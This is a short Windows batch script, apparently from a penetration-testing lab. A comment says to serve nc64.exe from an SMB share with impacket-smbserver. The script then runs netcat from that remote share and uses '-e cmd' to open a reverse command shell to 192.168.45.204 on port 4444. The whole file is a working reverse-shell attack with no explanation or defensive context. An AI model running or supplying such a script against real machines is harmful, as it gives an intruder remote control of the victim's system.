REM host nc64.exe in an smb2 supported share using: impacket-smbserver -smb2support share .
@echo off
\\192.168.45.204\share\nc64.exe -e cmd 192.168.45.204 4444 
PAUSE

